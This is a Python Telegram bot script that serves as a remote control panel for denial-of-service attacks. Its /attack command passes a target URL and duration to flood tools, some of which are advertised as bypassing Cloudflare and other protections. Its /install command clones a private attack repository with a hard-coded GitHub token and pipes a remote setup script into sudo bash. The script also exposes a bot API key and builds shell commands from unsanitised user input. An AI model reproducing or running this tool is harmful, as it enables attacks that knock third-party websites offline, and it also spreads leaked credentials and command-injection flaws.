import numpy as np
import logging
from telegram.ext import *
import os
import os.path
import time
delay = 1.5
API_KEY = '5086198463:AAFasc71unW8goTVjPCQ0UEoOaL-TFPWwQA'

# Set up the logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logging.info('Starting Bot...')

def methods_command(update, context):
    update.message.reply_text("Methods: \n  NUKER - Can bypass some protection\n  NULLGET - A null get flood request\n  NULLHEAD - A null head flood request\n  CFB - Can bypass cloudflare\n  SUPERBYPASS - Strong bypass with multi-bypass")

	
def attack_command(update, context):
	file_exists = os.path.exists('dos4dospersonal/dos4dos.py')
	if(file_exists == False):
		update.message.reply_text("Please install first\nto install /install")
	else:
		np.attack = context.args
		if not np.attack:
			update.message.reply_text("Usage:\n/attack <method> <url> <seconds>")
		###np.methods = ["NUKER","NUKERPRO","NULLGET","NULLHEAD","CFB"]
		if(np.attack[0].lower() == "nuker"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && node nuker.js ' + np.attack[1] + ' ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "nullget"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && python3 dos4dos.py supernull ' + np.attack[1] + ' 1 1000 all http.txt 1000000 ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "nullhead"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && python3 dos4dos.py null ' + np.attack[1] + ' 1 1000 all http.txt 1000000 ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "cfb"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && python3 dos4dos.py cfb ' + np.attack[1] + ' 1 1000 all http.txt 1000000 ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "raw"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && node raw.js ' + np.attack[1] + ' ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "superbypass"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && node method.js ' + np.attack[1] + ' 1200 proxy ' + np.attack[2] + ' &')
		elif(np.attack[0].lower() == "nukerpost"):
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[2] + ""
			update.message.reply_text(msg)
			os.system('cd dos4dospersonal && node nukerpost.js ' + np.attack[1] + ' ' + np.attack[2] + ' &')
		else:
			update.message.reply_text("Method not found!")
def stop_command(update, context):
	#os.system("killall node")
	#os.system("killall node")
	#os.system("killall python3")
	##os.system("killall python3")
	##os.system("killall -9 method.js") 
	update.message.reply_text('Stopped')


def help_command(update, context):
	update.message.reply_text("/help - To access this commands\n/attack - /attack nuker https://exple.com 8282828\n/methods - To see available methods\n/stop - To stop running attacks")

def change_command(update, context):
	update.message.reply_text("/change <seconds>\n change command is to change the server your using, with seconds when the server come back")
	##np.change = context.args
	##if not np.change:
	##	update.message.reply_text("/change <seconds>")



def install_command(update, context):
	update.message.reply_text('Please Wait...')
	os.system("git clone https://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@github.com/phsk1d/dos4dospersonal && cd dos4dospersonal && unzip Dos4Dos.zip && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && python3 installer.py")
	time.sleep(5)
	update.message.reply_text('Done!')

def handle_message(update, context):
    text = str(update.message.text).lower()
    logging.info(f'User ({update.message.chat.id}) says: {text}')

    # Bot response
    response = responses.get_response(text)
    update.message.reply_text(response)


def error(update, context):
    # Logs errors
    logging.error(f'Update {update} caused error {context.error}')


# Run the programme
if __name__ == '__main__':
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher

    # Commands
    dp.add_handler(CommandHandler('attack', attack_command))
    dp.add_handler(CommandHandler('start', help_command))
    dp.add_handler(CommandHandler('methods', methods_command))
    dp.add_handler(CommandHandler('stop', stop_command))
    dp.add_handler(CommandHandler('help', help_command))
    dp.add_handler(CommandHandler('install', install_command))
    dp.add_handler(CommandHandler('change', change_command))

    # Messages
    dp.add_handler(MessageHandler(Filters.text, handle_message))

    # Log all errors
    dp.add_error_handler(error)
    # Run the bot
    updater.start_polling(delay)
    updater.idle()

